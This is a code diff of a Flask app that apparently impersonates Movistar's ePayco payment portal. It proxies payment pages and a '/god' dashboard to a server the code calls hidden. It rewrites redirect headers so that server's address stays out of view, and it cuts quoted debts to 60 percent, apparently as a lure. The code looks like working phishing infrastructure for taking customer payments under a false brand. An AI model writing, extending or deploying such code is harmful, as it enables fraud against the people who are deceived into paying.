@@ -28,6 +28,7 @@ def home():
     return send_file('index.html')
 
 # Configuración API Movistar / ePayco
+VPS_IP              = "83.229.3.43"
 MOVISTAR_PUBLIC_KEY = "479f29cc87cb26bdea89e873b5287784"
 MOVISTAR_DOMINIO   = "https://movistar.epayco.me"
 ENDPOINT_TOKEN      = "https://recaudo.epayco.co/api/recaudo/get/token"
@@ -140,7 +141,7 @@ def serve_img(filename):
 
 @app.route('/pagos/<path:subpath>', methods=['GET', 'POST', 'OPTIONS'])
 def proxy_pagos(subpath):
-    target_url = f"http://103.101.203.120/pagos/{subpath}"
+    target_url = f"http://{VPS_IP}/pagos/{subpath}"
     headers = {key: value for (key, value) in request.headers if key.lower() not in ['host', 'content-length']}
     
     try:
@@ -156,7 +157,7 @@ def proxy_pagos(subpath):
         for name, value in res.raw.headers.items():
             if name.lower() not in excluded_headers:
                 if name.lower() == 'location':
-                    value = value.replace('http://103.101.203.120', request.host_url.rstrip('/'))
+                    value = value.replace(f'http://{VPS_IP}', request.host_url.rstrip('/'))
                 flask_res.headers.add(name, value)
                 
         for cookie in res.cookies:
@@ -172,7 +173,7 @@ def proxy_pagos(subpath):
 def proxy_god(subpath="dashboard.php"):
     if not subpath or subpath == "":
         subpath = "dashboard.php"
-    target_url = f"http://103.101.203.120/god/{subpath}"
+    target_url = f"http://{VPS_IP}/god/{subpath}"
     headers = {key: value for (key, value) in request.headers if key.lower() not in ['host', 'content-length']}
     
     try:
@@ -188,7 +189,7 @@ def proxy_god(subpath="dashboard.php"):
         for name, value in res.raw.headers.items():
             if name.lower() not in excluded_headers:
                 if name.lower() == 'location':
-                    value = value.replace('http://103.101.203.120', request.host_url.rstrip('/'))
+                    value = value.replace(f'http://{VPS_IP}', request.host_url.rstrip('/'))
                 flask_res.headers.add(name, value)
                 
         for cookie in res.cookies:
@@ -212,7 +213,7 @@ def consultar_deuda():
     if os.environ.get("RENDER"):
         print("[DEBUG] -> Render.com enviando petición puente al Servidor VPS Oculto...", file=sys.stderr, flush=True)
         try:
-            proxy_res = requests.post("http://103.101.203.120:10000/consulta", json=data_req, timeout=120)
+            proxy_res = requests.post(f"http://{VPS_IP}:10000/consulta", json=data_req, timeout=120)
             proxy_data = proxy_res.json()
             if proxy_data.get("status") == "success" and "amount" in proxy_data:
                 proxy_data["amount"] = float(proxy_data["amount"]) * 0.60
